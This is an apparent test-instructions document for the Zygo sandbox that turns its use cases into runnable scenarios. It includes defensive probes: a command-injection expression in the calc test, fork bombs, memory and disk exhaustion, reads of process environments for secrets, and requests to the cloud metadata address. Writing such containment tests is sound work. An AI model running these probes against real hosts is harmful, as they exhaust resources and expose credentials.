# Use-case test instructions

Six markets were named for Zygo. This document turns the ones that can be
exercised on the hardware at hand into scenarios of the form *install this,
run that, expect this, write down the number*. It is written to be executed
by someone who has never opened the code, and its output is a report,
[use_case_test_report.md](use_case_test_report.md), one row per scenario.

Date written: 21 September 2026, against the working tree at `945e41a` plus
the uncommitted API work (`POST /run`, `PUT /fn/<name>`, `zygo mcp`).

## What is and is not on the table

| # | Use case | Testable today? | Where | Why / why not |
|---|---|---|---|---|
| 1 | Self-hosted AI agent tool runner | **Yes**, on `ns`; `gvisor` optional | Lima VM | Egress allowlist, fresh process per request, secrets as per-request files all exist. The `vm` backend does not, and the VM has no KVM, so the hardware boundary this market asks for is recorded as a gap, not tested. |
| 2 | Script runner embedded in a platform | **Yes**, fully | Lima VM + host tools | `stdin` mode, blue/green `up`, venv and apt layers, HTTP API, logs. The embedder's script driver suite already passed; the scenarios here add n8n and a Temporal worker as real embedders. |
| 3 | Multi-tenant SaaS user-defined functions | **Yes** | Lima VM | Per-tenant cgroups, concurrency limits, `429` backpressure, secrets per function, batch endpoint. Multi-machine pooling is not built and not tested. |
| 4 | Untrusted file parsing | **Yes** | Lima VM | `zygo run` per file with a read-only mount; hostile inputs against `mem`, `scratch`, `pids`, `timeout`. "Thousands per second" is measured inside the VM, where the 100 ms shim hop does not apply. |
| 5 | ARM / Raspberry Pi / home lab | **Partly** | Lima VM (aarch64) and, if reachable, the Pi from earlier rounds | The Lima VM is already aarch64, so every scenario above is an ARM run. The static-musl, no-daemon, ordinary-user claims need the Pi. |
| 6 | Online judge / education | **Yes** | Lima VM | A Judge0-shaped driver is forty lines over `zygo run`. TLE vs MLE are both exit 137 at the CLI; the scenario checks whether the API's `timed_out` flag closes that. |
| 7 | Security isolation (added at request) | **Yes**, as a primitive | Lima VM | Supply-chain isolation, SSRF-safe fetch, a scanner in a box — all on today's `ns` binary, backed by the escape suite. Zygo contains hostile code but does not analyse it: no audit mode, no network log, no structured result. Not a browser plugin; a browser could call `zygo api` behind native messaging, but the engine is not an extension. |

Not testable on this machine, and not attempted: `isolation = "vm"` (no KVM;
backend not built), `bandwidth` receive shaping (needs an `ifb` device),
`io_read`/`io_write` on the VM's virtual disk, the Python `zygo.Pool()`
binding (not built), `zygo exec --batch` (flag exists, not implemented —
todo D-07; use `/fn/<name>/batch` over HTTP instead).

## The environment

Everything runs from this Mac through the shim, which forwards each command
into the `zygo` Lima instance. What `zygo doctor` says about that VM on the
day of writing:

```
kernel 6.8.0 (degraded: 2 years old)   user namespaces ok   cgroup v2 ok
overlayfs (userns) ok   landlock ABI v4   seccomp ok   subuid/subgid ok
kvm: no /dev/kvm   runsc: not installed   egress (pasta + nft + tc) ok
backends available: ns
```

Two rules of the shim shape every scenario below:

1. **Work under `$HOME`.** The VM mounts your home directory at the same path,
   writable, and refuses a command or a `--mount` source from anywhere else
   (`/tmp`, `/var/folders`, …). Every scenario uses `~/zygo-uc/`.
2. **Environment variables do not cross the hop** (todo B-28). `--secret NAME`
   and `ZYGO_API_TOKEN` are read from the shell that runs `serve`/`up`/`api`,
   and from the Mac that shell is not the one inside the VM. Scenarios that
   need them say `inside the VM` and are run from:

   ```bash
   limactl shell zygo
   cd ~/zygo-uc/<scenario>    # same path, same files
   ```

   The guest binary is `/usr/local/bin/zygo`. Latency numbers are also taken
   inside the VM: the hop costs about 100 ms per command and would otherwise
   be the only thing measured.

Two binaries are in play. `~/.cargo/bin/zygo` was installed at 02:30 on
21 September and predates the API work; the working tree has `POST /run`,
`PUT /fn/<name>`, `DELETE /fn/<name>`, `--allow-deploy` and `zygo mcp`.
Scenarios marked **[working tree]** need:

```bash
cargo build --release && cargo install --path crates/zygo-cli --force
make poc/zygo-linux-musl        # the guest binary; the shim re-installs it
```

If the tree does not build at the time (`zygo mcp` is declared in `cli.rs`
but `cmd/mcp.rs` was not yet present when this was written), record those
scenarios as *blocked: not built* and move on.

## How to record a result

One row per scenario in the report, with these columns:

| Column | Meaning |
|---|---|
| ID | e.g. `1.3` |
| Result | `pass` / `fail` / `blocked` / `partial` |
| Measured | the numbers the scenario asks for, or `—` |
| Evidence | the command output line that proves it, trimmed |
| Defect | one line, if any; add it to `todo.md` in the same style as the adoption rounds |

Four rules, taken from the README because they are what made earlier suites
honest:

* **Attempt the thing.** A scenario that reads a setting is not a test.
* **A negative check first proves the positive.** "The connection was
  refused" must be preceded by "the same connection to an allowed host
  succeeded" in the same sandbox, or it proves nothing.
* **Do not measure the shim.** Latency inside the VM only.
* **Check for leaks after every load scenario** with the block in §0.4.

## 0. Common setup

### 0.1 Build, install, check

```bash
cd ~/workspace/mhmt/ahmed
cargo build --release && cargo install --path crates/zygo-cli --force
make poc/zygo-linux-musl
zygo doctor           # paste the VM block into the report header
zygo --version
```

### 0.2 Images

Pull once so no scenario measures a download:

```bash
zygo pull python:3.12-slim
zygo pull alpine:3
zygo pull node:22-alpine
zygo pull gcc:13          # ~1 GB; only for UC6
zygo images
```

### 0.3 Tools on the Mac

| Tool | Used by | Install |
|---|---|---|
| `curl`, `jq`, `python3`, `node`, `go` | most | present |
| `ab` (ApacheBench) | UC3 load | present (`/opt/homebrew/bin/ab`) |
| `oha` | nicer than `ab`, optional | `brew install oha` |
| Temporal CLI | UC2.9 | `brew install temporal` |
| n8n | UC2.8 | `npx n8n` (Node 22 is present) |
| Windmill | UC2.10, optional, heavy | `docker compose` from windmill's repo |

### 0.4 Leak check (run after every load scenario)

```bash
limactl shell zygo -- sh -c '
  echo "zygo procs: $(pgrep -c zygo || echo 0)";
  echo "sandbox roots: $(ls ~/.local/share/zygo/tmp 2>/dev/null | wc -l)";
  echo "cgroups: $(find /sys/fs/cgroup/user.slice -maxdepth 6 -name "*zygo*" 2>/dev/null | wc -l)";
  mount | grep -c zygo || true;
  df -h / | tail -1'
zygo image prune --dry-run
```

Take the numbers before and after; the delta is the finding.

### 0.5 Workspace

```bash
mkdir -p ~/zygo-uc && cd ~/zygo-uc
```

Each scenario creates its own subdirectory. `zygo down` or `zygo stop --all`
at the end of each scenario; `zygo stop --all` also stops the VM, so use
`zygo down -f <spec>` between scenarios and `stop --all` only at the end of a
session.

---

## 1. Self-hosted AI agent tool runner

The claims: a tool call costs a fork, the model's input cannot reach the
network unless listed, a secret is a file the zygote never holds, and each
call starts from clean state.

### 1.1 The shipped example, as shipped

```bash
cd ~/workspace/mhmt/ahmed/examples/agent-tool
zygo up
zygo exec calc '{"expression": "2 ** 10 / 4"}'                      # {"result": 256.0}
zygo exec calc '{"expression": "__import__(\"os\").system(\"id\")"}'  # {"error": ...}
zygo exec calc '{"expression": "9 ** 9 ** 9"}'; echo "exit $?"      # exit 137 within ~2 s
zygo logs calc --failed -n 5
zygo down
```

Expected: three answers exactly as the README says; the third returns in
about two seconds, not longer. Record the wall time of the third.

### 1.2 What the tool sandbox refuses (`seccomp = "strict"`, `pids = 4`, no network)

Create `~/zygo-uc/uc1/probe.py` — a handler that *tries* one thing per event:

```python
import os, socket, subprocess, sys

def handler(event):
    what = event["try"]
    try:
        if what == "socket":
            socket.socket().connect(("1.1.1.1", 443)); return {"ok": True}
        if what == "fork":
            n = 0
            while n < 50:
                if os.fork() == 0: os._exit(0)
                n += 1
            return {"forked": n}
        if what == "exec":
            return {"out": subprocess.run(["id"], capture_output=True).stdout.decode()}
        if what == "secrets":
            return {"files": os.listdir("/run/secrets")}
        if what == "env":
            return {"env": {k: v for k, v in os.environ.items() if "KEY" in k or "SECRET" in k}}
        if what == "rootfs":
            open("/etc/probe", "w").write("x"); return {"wrote": True}
        if what == "state":
            global counter
            counter = globals().get("counter", 0) + 1
            open("/tmp/state", "a").write("x")
            return {"counter": counter, "tmp_len": os.path.getsize("/tmp/state")}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}
```

`~/zygo-uc/uc1/sandbox.toml`:

```toml
[fn.probe]
image   = "python:3.12-slim"
entry   = "probe.py"
seccomp = "strict"
mem     = "64M"
pids    = 4
timeout = "2s"
```

```bash
cd ~/zygo-uc/uc1 && zygo up
for t in socket fork exec secrets env rootfs; do
  printf '%-8s ' $t; zygo exec probe "{\"try\": \"$t\"}"; echo " (exit $?)"
done
```

Expected, one line each: `socket` → error (strict denies `socket()`, or the
empty netns refuses), `fork` → error before 50 (pids = 4), `exec` → error
(strict denies `execve` in the forked child; the README notes only the
Python agent honours this), `secrets` → `[]` or a missing-directory error,
`env` → `{}`, `rootfs` → read-only error. Any `{"ok": true}` or
`{"forked": 50}` is a defect.

### 1.3 Clean state per request

```bash
for i in 1 2 3; do zygo exec probe '{"try": "state"}'; echo; done
```

Expected: `counter` is `1` every time and `tmp_len` is `1` every time.
A `2` anywhere means state leaked across forks, which is the headline claim.

### 1.4 Egress allowlist for a tool that fetches

`~/zygo-uc/uc1/fetch.py`:

```python
import urllib.request, socket

def handler(event):
    url = event["url"]
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return {"status": r.status, "bytes": len(r.read())}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}
```

Add to `sandbox.toml`:

```toml
[fn.fetch]
image   = "python:3.12-slim"
entry   = "fetch.py"
network = "egress"
allow   = ["example.com:443"]
timeout = "10s"
```

```bash
zygo up
zygo exec fetch '{"url": "https://example.com/"}'           # positive case first
zygo exec fetch '{"url": "http://example.com/"}'            # same host, port 80: refused
zygo exec fetch '{"url": "https://api.github.com/"}'        # name not on the list: no DNS answer
zygo exec fetch '{"url": "https://93.184.215.14/"}'         # literal IP of an allowed name
zygo exec fetch '{"url": "http://10.0.0.1/"}'               # private range
zygo exec fetch '{"url": "http://169.254.169.254/latest/meta-data/"}'  # the cloud metadata address
```

Expected: first → `status: 200`; every other line → an error, and for
`api.github.com` specifically a *name resolution* error rather than a
connection timeout (the resolver is Zygo's own). Record which error each one
gives and how long the refused ones take to fail — a 5 s timeout on every
refusal is a usability finding even if it is secure.

Then prove the allowlist is enforced on the name, not by luck: edit `allow`
to `["*.github.com:443"]`, `zygo up` (only `fetch` should restart), and
repeat the `api.github.com` line — it must now succeed.

### 1.5 The secret the agent never sees (inside the VM)

`~/zygo-uc/uc1/secret.py`:

```python
import os
def handler(event):
    p = "/run/secrets/API_KEY"
    return {
        "present": os.path.exists(p),
        "value_prefix": open(p).read()[:4] if os.path.exists(p) else None,
        "mode": oct(os.stat(p).st_mode & 0o777) if os.path.exists(p) else None,
        "in_env": "API_KEY" in os.environ,
    }
```

```bash
limactl shell zygo
cd ~/zygo-uc/uc1
export API_KEY=sk-test-1234567890
zygo serve secret.py --name secret --secret API_KEY
zygo exec secret '{}'                     # {"present": true, "value_prefix": "sk-t", "mode": "0o400", "in_env": false}
zygo shell secret -- ls -la /run/secrets  # between requests: empty or absent
zygo shell secret -- sh -c 'cat /proc/1/environ | tr "\0" "\n" | grep -c API_KEY'   # 0
zygo shell secret -- sh -c 'grep -a -c sk-test /proc/1/maps /proc/1/cmdline 2>/dev/null' # 0
zygo stop secret
exit
```

Expected as in the comments. Also try the same `serve` from the Mac shell
with `export API_KEY=…` first and record what happens — that is B-28, and
the report should say whether the failure is loud or silent.

### 1.6 Concurrency and backpressure

A function with `concurrency = 2`, then 12 calls at once:

```bash
cat > slow.py <<'PY'
import time
def handler(event):
    time.sleep(event.get("s", 1)); return {"slept": event.get("s", 1)}
PY
zygo serve slow.py --name slow --concurrency 2 --timeout 5s
for i in $(seq 12); do (zygo exec slow '{"s": 1}' >/dev/null 2>&1; echo "exit $?") & done; wait | sort | uniq -c
```

Expected: 2 in flight, up to 8 queued, the rest exit 75 (`BUSY`). Record the
distribution. A `137` here would be the queue wait counting against the
request deadline, which is worth knowing.

### 1.7 `POST /run` for a code-interpreter tool **[working tree]** (inside the VM)

```bash
limactl shell zygo
export ZYGO_API_TOKEN=$(openssl rand -hex 16)
zygo api --allow-deploy &
sleep 1
curl -s -H "Authorization: Bearer $ZYGO_API_TOKEN" -d '{
  "layer": {"image": "python:3.12-slim", "cmd": ["python3", "-c", "import sys; print(sys.stdin.read().upper())"],
            "mem": "64M", "timeout": "5s", "seccomp": "strict"},
  "stdin": "hello from the model"
}' http://127.0.0.1:7700/run | jq
```

Expected: `exit_code: 0`, `stdout: "HELLO FROM THE MODEL\n"`, `timed_out:
false`, a `wall_ms`. Then three negatives: `cmd` that sleeps 10 s with
`timeout: "1s"` → 200 with `exit_code: 137`; a `mounts` entry with a relative
source → 400 naming the rule; the same call against `zygo api` started
*without* `--allow-deploy` → 403 whose body names the flag. Record
`wall_ms` for the first call — that is the cold-start cost a tool call pays.

### 1.8 MCP server **[working tree]**

`zygo mcp` speaks JSON-RPC on stdin/stdout. Without an agent host, drive it by
hand:

```bash
cd ~/zygo-uc/uc1
printf '%s\n' \
 '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"0"}}}' \
 '{"jsonrpc":"2.0","method":"notifications/initialized"}' \
 '{"jsonrpc":"2.0","id":2,"method":"tools/list"}' \
 '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"run_code","arguments":{"language":"python","code":"print(2**100)"}}}' \
 '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"run_code","arguments":{"language":"python","code":"import urllib.request; urllib.request.urlopen(\"https://example.com\")"}}}' \
 '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"run_code","arguments":{"language":"sh","code":"echo hi > /work/a.txt; cat /work/a.txt"}}}' \
 | zygo mcp --mem 64M --timeout 5s
```

Expected: `tools/list` names the tools and their schemas; id 3 returns
`1267650600228229401496703205376`; id 4 fails (no network by default, and no
tool argument can turn it on); id 5 shows `/work` persisting within the
session. Then the real test: add it to Claude Code as
`{ "mcpServers": { "zygo": { "command": "zygo", "args": ["mcp"] } } }`, ask
the model to "compute the 50th Fibonacci number in Python and then curl
example.com", and record both tool results.

### 1.9 `gvisor` for the same tool (optional, one-shot only)

```bash
zygo backend install gvisor
zygo backend list
zygo run --isolation gvisor python:3.12-slim python3 -c 'import platform; print(platform.release())'
zygo run --isolation ns     python:3.12-slim python3 -c 'import platform; print(platform.release())'
zygo run --isolation gvisor --mem 64M --timeout 2s python:3.12-slim python3 -c 'x = "a" * (200 << 20)'; echo "exit $?"
zygo serve probe.py --name g --isolation gvisor      # expected: refused with a reason
```

Expected: the two kernel strings differ; the memory limit still produces
137; `serve` on gvisor is refused, not weakened. Record the cold `run` wall
time on each backend (time the command inside the VM).

### 1.10 What this market asks for and cannot get here

Write one paragraph in the report, not a row: `isolation = "vm"` is what the
agent-tool README says to use for code you cannot read; it needs KVM and is
not built. The Lima VM has no `/dev/kvm`. This is the largest gap for the
largest market and it is not a test result, it is a status.

---

## 2. Script runner embedded in a platform

The claims: a platform's "run the user's script" step becomes `serve` +
`exec`, existing stdin-style scripts run unchanged, updates are blue/green,
dependencies are built once, and the whole thing is observable.

### 2.1 Windmill-style `stdin` script

`~/zygo-uc/uc2/transform.py` — reads the event on stdin, prints the result:

```python
import json, sys
event = json.load(sys.stdin)
rows = event["rows"]
print(json.dumps({"n": len(rows), "total": sum(r["amount"] for r in rows)}))
print("processed", len(rows), file=sys.stderr)
```

`~/zygo-uc/uc2/sandbox.toml`:

```toml
[defaults]
image = "python:3.12-slim"
mem   = "128M"

[fn.transform]
entry = "transform.py"
mode  = "stdin"
```

```bash
cd ~/zygo-uc/uc2 && zygo up
zygo exec transform '{"rows": [{"amount": 3}, {"amount": 4}]}'   # {"n": 2, "total": 7}
zygo logs transform -n 1          # the stderr line is there, beside the result
```

### 2.2 Warm-exec in another language (Node, no agent)

`~/zygo-uc/uc2/h.js`:

```js
let s = ""; process.stdin.on("data", d => s += d).on("end", () => {
  const e = JSON.parse(s); console.log(JSON.stringify({ upper: e.text.toUpperCase(), len: e.text.length }));
});
```

```toml
[fn.node]
image  = "node:22-alpine"
mounts = ["./h.js:/app/h.js:ro"]
cmd    = ["node", "/app/h.js"]
```

```bash
zygo up                                       # only `node` starts; `transform` is left alone — confirm in the output
zygo exec node '{"text": "warm exec"}'
```

Record the request time inside the VM for ten calls: `for i in $(seq 10);
do /usr/bin/time -f %e zygo exec node '{"text":"x"}' >/dev/null; done`. Node
start-up is the cost here, which is what the agent protocol exists to
amortise; the number is the argument for writing a Node agent.

### 2.3 Compiled warm-exec (Go, cross-compiled from the Mac)

```bash
cd ~/workspace/mhmt/ahmed/examples/warm-exec/go
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -o bin/parse .    # the VM is aarch64
zygo up
zygo exec parse '{"text": "warm exec in go", "n": 12}'
zygo down
```

Expected: the README's answer. Measure ten calls as in 2.2 and compare.

### 2.4 Dependencies: venv built once, shared

```bash
cd ~/zygo-uc/uc2
printf 'requests==2.32.3\npydantic==2.9.2\n' > requirements.txt
cat > deps.py <<'PY'
import requests, pydantic
def handler(event): return {"requests": requests.__version__, "pydantic": pydantic.VERSION}
PY
cat >> sandbox.toml <<'T'

[fn.deps]
entry        = "deps.py"
requirements = "requirements.txt"

[fn.deps2]
entry        = "deps.py"
requirements = "requirements.txt"
T
time zygo up          # builds the venv once (needs network for pip; record the time)
zygo exec deps '{}' && zygo exec deps2 '{}'
zygo down -f sandbox.toml && time zygo up      # second time: cached, seconds not minutes
```

Expected: both functions answer with the pinned versions; the second `up` is
fast; `zygo images` / the venv cache shows one venv, not two. Record both
`up` times.

### 2.5 System packages as a layer, and `zygo.lock`

```toml
[fn.sysdeps]
entry  = "sys.py"
system = ["jq", "libwebp7"]
```

```python
# sys.py
import subprocess
def handler(event):
    return {"jq": subprocess.run(["jq", "--version"], capture_output=True, text=True).stdout.strip()}
```

```bash
zygo up && zygo exec sysdeps '{}'      # {"jq": "jq-1.7..."}
cat zygo.lock                          # digest per function, apt versions for sysdeps
zygo up                                # nothing restarts
```

Then the lock's refusal: edit nothing, and simulate an image move by editing
the `digest` line of `[fn.sysdeps]` in `zygo.lock` to a wrong value; `zygo
up` must refuse and print both digests; `zygo up --relock` accepts.

### 2.6 Blue/green update with a request in flight

This is the open item from the Raspberry Pi run (todo.md, "Open, with
evidence"), so it is worth running here more than once.

```bash
cat > slow.py <<'PY'
import time
VERSION = 1
def handler(event):
    time.sleep(event.get("s", 0)); return {"version": VERSION}
PY
cat >> sandbox.toml <<'T'

[fn.slow]
entry       = "slow.py"
concurrency = 1
timeout     = "30s"
T
zygo up
zygo exec slow '{"s": 8}' &                    # holds the only slot for 8 s
sleep 1; zygo exec slow '{"s": 0}' &           # queued behind it
sleep 1; sed -i '' 's/VERSION = 1/VERSION = 2/' slow.py; zygo up   # replacement warms while both are pending
wait
```

Expected: the first call answers `version: 1` (it was accepted by the old
one); the queued call answers `version: 2` (admitted to the replacement once
it was ready, ~400 ms in). If the queued one answers `1`, that is the Pi bug
reproduced on a second machine — record the exact output and the timing, and
run it five times.

### 2.7 Idle pause and wake

```bash
zygo serve transform.py --name idle --mode stdin --idle-timeout 5s
zygo exec idle '{"rows": []}'
sleep 8; zygo ps                       # state: paused
limactl shell zygo -- sh -c 'cd ~/zygo-uc/uc2; for i in 1 2 3; do /usr/bin/time -f "%e s" zygo exec idle "{\"rows\": []}" >/dev/null; done'
```

Expected: the first call after the pause is not noticeably slower than the
next two (the README claims single-digit ms to thaw). Record the three times.

### 2.8 Observability an embedder needs (inside the VM)

```bash
limactl shell zygo
export ZYGO_API_TOKEN=$(openssl rand -hex 16); zygo api &
H="Authorization: Bearer $ZYGO_API_TOKEN"
curl -s -H "$H" -d '{"rows": [{"amount": 1}]}' http://127.0.0.1:7700/fn/transform
curl -s -H "$H" -d 'not json' http://127.0.0.1:7700/fn/transform -o /dev/null -w '%{http_code}\n'    # 4xx, not 500
curl -s -H "$H" -H 'X-Zygo-Timeout-Ms: 100' -d '{"s": 5}' http://127.0.0.1:7700/fn/slow -w '\n%{http_code}\n'  # 408
curl -s -H "$H" http://127.0.0.1:7700/fn/transform/stats | jq
curl -s -H "$H" http://127.0.0.1:7700/fn/transform/logs | head
curl -s -H "$H" http://127.0.0.1:7700/metrics | grep -E '^zygo_' | head -20
curl -s -o /dev/null -w '%{http_code}\n' -d '{}' http://127.0.0.1:7700/fn/transform      # no token: 401
zygo top --once
```

Record the metric names present; an embedder will scrape them.

### 2.9 A real embedder: n8n

```bash
cd ~/zygo-uc/uc2 && npx n8n            # http://localhost:5678, first start ~1 min
```

Keep `zygo api` from 2.8 running inside the VM (Lima forwards `127.0.0.1:7700`
to the Mac; confirm with `curl -s http://127.0.0.1:7700/healthz` from the
Mac — if it does not, add a `portForwards` entry to `shim/lima.yaml` and
record that as a finding). In n8n: Manual Trigger → HTTP Request node,
`POST http://127.0.0.1:7700/fn/transform`, header `Authorization: Bearer
<token>`, JSON body `{"rows": [{"amount": 5}]}` → execute. Expected: the
node shows `{"n": 1, "total": 5}`. Then set the body to `{"s": 10}` against
`/fn/slow` with `X-Zygo-Timeout-Ms: 1000` and confirm the node reports the
408 rather than hanging.

### 2.10 A real embedder: a Temporal worker

```bash
brew install temporal
temporal server start-dev &            # http://localhost:8233
python3 -m venv ~/zygo-uc/uc2/venv && ~/zygo-uc/uc2/venv/bin/pip install temporalio
```

`~/zygo-uc/uc2/worker.py`:

```python
import asyncio, json, subprocess
from temporalio import activity, workflow
from temporalio.client import Client
from temporalio.worker import Worker

@activity.defn
async def run_user_script(event: dict) -> dict:
    p = subprocess.run(["zygo", "exec", "transform", json.dumps(event)], capture_output=True, text=True, timeout=30)
    if p.returncode != 0:
        raise RuntimeError(f"exit {p.returncode}: {p.stderr.strip()}")
    return json.loads(p.stdout)

@workflow.defn
class Pipeline:
    @workflow.run
    async def run(self, rows: list) -> dict:
        return await workflow.execute_activity(run_user_script, {"rows": rows}, start_to_close_timeout=__import__("datetime").timedelta(seconds=60))

async def main():
    client = await Client.connect("localhost:7233")
    async with Worker(client, task_queue="zygo", workflows=[Pipeline], activities=[run_user_script]):
        result = await client.execute_workflow(Pipeline.run, [{"amount": 2}, {"amount": 5}], id="wf-1", task_queue="zygo")
        print(result)

asyncio.run(main())
```

```bash
~/zygo-uc/uc2/venv/bin/python worker.py      # {'n': 2, 'total': 7}
```

Expected: the activity completes and the Temporal UI shows one workflow with
one activity. Note in the report that from a Mac the activity pays the 100 ms
hop per call; a Linux worker would call the HTTP API or the library instead.

### 2.11 Windmill (optional, heavy)

Only if time allows: Windmill's `docker-compose.yml` from its repository,
then a Bash script in Windmill that runs `curl` against the Zygo API. This
tests nothing the n8n scenario does not; it is here because Windmill is the
named competitor and the design document (§4.8) describes the integration.
Record it as *not run* if skipped.

---

## 3. Multi-tenant SaaS user-defined functions

The claims: tenants cannot see each other, one tenant's misbehaviour does not
change another's latency, and the platform gets a `429` it can act on rather
than a slow host.

### 3.1 Two tenants, one host

`~/zygo-uc/uc3/udf.py`:

```python
import os, glob
def handler(event):
    op = event.get("op", "id")
    if op == "id":
        return {"pid": os.getpid(), "uid": os.getuid(), "hostname": open("/etc/hostname").read().strip(),
                "cgroup": open("/proc/self/cgroup").read().strip(), "procs": len(glob.glob("/proc/[0-9]*"))}
    if op == "write":
        open("/tmp/tenant-mark", "w").write(event["tenant"]); return {"ok": True}
    if op == "read":
        return {"mark": open("/tmp/tenant-mark").read() if os.path.exists("/tmp/tenant-mark") else None}
    if op == "spin":
        while True: pass
    if op == "alloc":
        x = bytearray(int(event.get("mb", 512)) << 20); return {"allocated": len(x)}
    if op == "fill":
        with open("/tmp/big", "wb") as f:
            while True: f.write(b"\0" * (1 << 20))
    if op == "fork":
        while True: os.fork()
```

```toml
[defaults]
image   = "python:3.12-slim"
entry   = "udf.py"
mem     = "128M"
cpu     = 0.5
pids    = 16
scratch = "32M"
timeout = "5s"

[fn.t-a]
[fn.t-b]
```

```bash
cd ~/zygo-uc/uc3 && zygo up
zygo exec t-a '{"op": "id"}'; zygo exec t-b '{"op": "id"}'
zygo exec t-a '{"op": "write", "tenant": "a"}'
zygo exec t-a '{"op": "read"}'       # null: /tmp does not survive the request (1.3 again)
zygo exec t-b '{"op": "read"}'       # null: and never t-a's
zygo shell t-a -- cat /proc/1/cgroup; zygo shell t-b -- cat /proc/1/cgroup   # different tenant cgroups
zygo shell t-a -- ps aux             # only its own processes
```

Expected: different hostnames, different cgroup paths under `tenants/`,
`procs` small (its own namespace), no cross-tenant file.

### 3.2 Noisy neighbour

Run t-b's latency in a loop inside the VM while t-a misbehaves four ways:

```bash
limactl shell zygo -- sh -c 'cd ~/zygo-uc/uc3; for i in $(seq 40); do /usr/bin/time -f %e zygo exec t-b "{\"op\":\"id\"}" 2>&1 >/dev/null; sleep 0.25; done' > /tmp/tb-latency.txt &
zygo exec t-a '{"op": "spin"}';  echo "spin  exit $?"    # 137 after 5 s; t-b unaffected meanwhile
zygo exec t-a '{"op": "alloc", "mb": 512}'; echo "alloc exit $?"   # 137 (OOM at 128M)
zygo exec t-a '{"op": "fill"}';  echo "fill  exit $?"    # ENOSPC at 32M or 137; /tmp is tmpfs counted against mem
zygo exec t-a '{"op": "fork"}';  echo "fork  exit $?"    # stops at 16 pids
wait; sort -n /tmp/tb-latency.txt | awk '{a[NR]=$1} END {print "p50", a[int(NR*0.5)], "p99", a[int(NR*0.99)]}'
```

Expected: all four end with the sandbox, not the host, and t-b's p99 during
the abuse is within a few ms of its p50 at rest (measure the resting p50
first with the same loop). Record the four exit codes and the two p99s.

### 3.3 Secrets per tenant (inside the VM)

```bash
limactl shell zygo; cd ~/zygo-uc/uc3
export A_KEY=aaaa B_KEY=bbbb
cat > sec.py <<'PY'
import os
def handler(event): return {"files": sorted(os.listdir("/run/secrets"))}
PY
zygo serve sec.py --name t-a-sec --secret A_KEY
zygo serve sec.py --name t-b-sec --secret B_KEY
zygo exec t-a-sec '{}'; zygo exec t-b-sec '{}'     # ["A_KEY"] and ["B_KEY"], never both
```

### 3.4 Deploying a tenant's function over the API **[working tree]** (inside the VM)

```bash
export ZYGO_API_TOKEN=$(openssl rand -hex 16); zygo api --allow-deploy &
H="Authorization: Bearer $ZYGO_API_TOKEN"
curl -s -X PUT -H "$H" -d "{\"layer\": {\"image\": \"python:3.12-slim\", \"entry\": \"udf.py\", \"mem\": \"128M\"}, \"base_dir\": \"$HOME/zygo-uc/uc3\", \"if_changed\": true}" http://127.0.0.1:7700/fn/t-c | jq
curl -s -H "$H" -d '{"op": "id"}' http://127.0.0.1:7700/fn/t-c
curl -s -X PUT -H "$H" -d "…same body…" http://127.0.0.1:7700/fn/t-c | jq     # if_changed: not a second deploy — check the pid is unchanged
curl -s -X DELETE -H "$H" http://127.0.0.1:7700/fn/t-c -w '%{http_code}\n'
curl -s -X PUT -H "$H" -d '{"layer": {"image": "python:3.12-slim", "entry": "udf.py"}, "base_dir": "relative/path"}' http://127.0.0.1:7700/fn/t-d -w '%{http_code}\n'   # 400: base_dir must be absolute
```

### 3.5 Backpressure under load (inside the VM)

```bash
zygo serve udf.py --name t-load --concurrency 4 --cpu 1 --timeout 5s
ab -n 2000 -c 32 -p <(echo '{"op":"id"}') -T application/json -H "$H" http://127.0.0.1:7700/fn/t-load
```

Record: requests/s, p50/p99, and the count of non-2xx (the `429`s with
`Retry-After`). Then the same with `-c 4`: the `429`s should vanish and the
throughput number is the one to quote. Compare with `zygo bench warm --rate
250` and `zygo bench load --help` (the built-in measurements, which also
report whether the tenant hit its CPU quota — quote that line).

Run §0.4 afterwards.

### 3.6 Batch ETL

```bash
python3 -c 'import json; print(json.dumps([{"op": "id"} for _ in range(1000)]))' > batch.json
time curl -s -H "$H" -d @batch.json http://127.0.0.1:7700/fn/t-load/batch | jq 'length'
```

Expected: 1000 answers in order; record the wall time and events/s. Try
10 000 and record what happens — todo S-06 says the batch size is not yet
capped, so an unbounded answer or a memory spike is the expected finding.

---

## 4. Untrusted file parsing

The claims: one fresh process per file, a read-only view of the input, and
hostile files exhaust a limit rather than the host.

### 4.1 Setup

```bash
mkdir -p ~/zygo-uc/uc4/in && cd ~/zygo-uc/uc4
printf 'pypdf==5.1.0\nPillow==11.0.0\n' > requirements.txt
cat > parse.py <<'PY'
import sys, json, zipfile, tarfile
from pathlib import Path
p = Path(sys.argv[1])
try:
    if p.suffix == ".pdf":
        from pypdf import PdfReader; r = PdfReader(str(p)); out = {"pages": len(r.pages), "text": len((r.pages[0].extract_text() or ""))}
    elif p.suffix in (".png", ".jpg", ".webp"):
        from PIL import Image; im = Image.open(p); im.load(); out = {"size": im.size, "mode": im.mode}
    elif p.suffix == ".zip":
        with zipfile.ZipFile(p) as z: z.extractall("/tmp/x"); out = {"members": len(z.namelist())}
    elif p.suffix in (".tar", ".tgz"):
        with tarfile.open(p) as t: t.extractall("/tmp/x", filter="data"); out = {"members": len(t.getnames())}
    else:
        out = {"bytes": p.stat().st_size}
    print(json.dumps(out))
except Exception as e:
    print(json.dumps({"error": f"{type(e).__name__}: {e}"})); sys.exit(1)
PY
```

`zygo run` has no `--requirements` flag and reads only `[defaults]` from a
spec file — `examples/ci-job/README.md` shows one, and that is a
documentation defect to record. A one-shot sandbox gets its packages the
way the adopter's driver does: installed once into a directory, mounted read-only
at `/packages`, and put on `sys.path`. Build that directory inside a sandbox
so the wheels are Linux/aarch64 ones, not the Mac's:

```bash
mkdir -p packages
zygo run --net egress --allow pypi.org:443 --allow files.pythonhosted.org:443 \
  --mount $HOME/zygo-uc/uc4/packages:/packages:rw --mount $HOME/zygo-uc/uc4/requirements.txt:/req.txt:ro \
  --timeout 5m --mem 512M python:3.12-slim pip install --no-cache-dir --target /packages -r /req.txt
ls packages | head          # pypdf, PIL, ...
```

That call is also the first egress test of the pass: it must succeed with
the two hosts listed and fail without them (run it once more with `--net
none` and confirm pip cannot reach the index).

